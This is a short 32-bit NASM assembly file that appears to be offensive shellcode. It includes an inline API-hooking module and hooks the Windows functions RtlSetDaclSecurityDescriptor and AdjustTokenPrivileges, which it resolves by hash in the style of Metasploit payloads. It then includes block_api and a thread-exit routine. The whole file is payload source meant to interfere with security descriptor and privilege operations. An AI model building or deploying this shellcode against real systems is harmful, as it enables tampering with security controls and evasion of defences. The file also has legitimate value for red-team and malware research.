[BITS 32]


	cld                             ; Clear direction flags
	call get_hook_api               ; Get the address of inline_hook_api.asm to stack
	%include "inline_hook.asm"      ; https://github.com/egebalci/Hook_API
get_hook_api:                       ;
	pop ebp                         ; Pop out the address of inline_hook_api.asm to EBP
	push 0xE57FF92D                 ; hash("NTDLL.dll", "RtlSetDaclSecurityDescriptor")
	call ebp                        ; hook("RtlSetDaclSecurityDescriptor")
	push 0x330A1F75                 ; hash("ADVAPI32.dll", "AdjustTokenPrivileges")
	call ebp
	call get_block_api              ; 	
	incbin "block_api"              ; nasm -f bin block_api.asm
get_block_api:                      ;
	pop ebp                         ; Pop out the block_api address to EBP
	%include "block_exitfunk.asm"   ; Exit the thread accordingly	

